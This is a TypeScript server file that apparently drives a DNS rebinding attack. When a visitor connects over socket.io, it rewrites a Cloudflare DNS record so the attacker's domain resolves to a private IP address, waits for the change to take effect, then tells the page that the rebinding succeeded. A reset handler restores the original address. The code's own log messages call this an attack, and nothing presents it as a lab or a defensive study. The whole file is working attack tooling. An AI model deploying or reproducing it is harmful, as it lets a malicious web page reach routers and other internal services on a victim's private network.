require("dotenv").config();

import * as http from "http";
import express = require("express");
import path = require("path");
import { Server, Socket } from "socket.io";
import { resolveDomainName, getAllDnsRecords, updateDnsRecord, waitForResolution } from "./utils";

const app = express();

const server = http.createServer(app);

const io = new Server(server);

let rebindDnsRecord: DnsRecord | undefined;

let busyRebindingDns = false;

app.use(express.static(path.join(__dirname, "pub")));

const handleDnsReset = async (socket: Socket) => {
  if (busyRebindingDns) return;

  await rebind(process.env.REBIND_ORIGINAL_IP, 0, socket, "");
};

const handleNewSocketConnection = async (socket: Socket) => {
  console.log("a user connected");

  /**
   * Send the client what the domain currently resolves to
   */
  try {
    let resolution = await resolveDomainName(process.env.REBIND_DOMAIN);
    console.log(JSON.stringify(resolution, null, 2));
    socket.emit("dns-update", resolution[0]);
  } catch (err) {
    return console.log(err);
  }

  if (!rebindDnsRecord)
    return console.log("Can't carry out attack because we haven't found our dns record to rebind");

  if (busyRebindingDns) return;

  /**
   * Update the dns to point to a private ip address;
   */

  await rebind(
    process.env.REBIND_NEW_IP,
    200,
    socket,
    " domain has successfully rebinded to private ip address"
  );
};

const rebind = async (
  ipAddress: string,
  ttl: DnsRecord["ttl"],
  socket: Socket,
  message: string
) => {
  busyRebindingDns = true;
  console.log("Rebinding DNS");

  rebindDnsRecord.content = ipAddress;
  rebindDnsRecord.ttl = ttl;

  try {
    let res = await updateDnsRecord(rebindDnsRecord);
    console.log(JSON.stringify(res, null, 2));
  } catch (err) {
    console.log("Failed to update dns record", JSON.stringify(err, null, 2));
    busyRebindingDns = false;
    return;
  }

  let resolution = [];
  try {
    resolution = await waitForResolution(ipAddress, process.env.REBIND_DOMAIN, 50, 5000);
  } catch (err) {
    console.log("The rebind domain did not resolve in time");
    busyRebindingDns = false;
    return;
  }
  busyRebindingDns = false;
  socket.emit("dns-update", resolution[0] + message);
};

const init = async () => {
  try {
    let dnsRecordList = await getAllDnsRecords(process.env.CF_ZONE_ID);

    rebindDnsRecord = dnsRecordList.find((record) => {
      return record.name === process.env.REBIND_DOMAIN;
    });

    if (!rebindDnsRecord) {
      console.log(`Could find the dns record for ${process.env.REBIND_DOMAIN}`);
      return;
    }
  } catch (err) {
    console.log("Failed while fetching all dns records", err);
    return;
  }
};

const main = () => {
  io.on("connection", (socket) => {
    handleNewSocketConnection(socket);

    socket.on("dns-reset", () => {
      handleDnsReset(socket);
    });
  });

  server.listen(3000, () => {
    console.log("listening on http://localhost:3000");
  });
};

init().then(main);
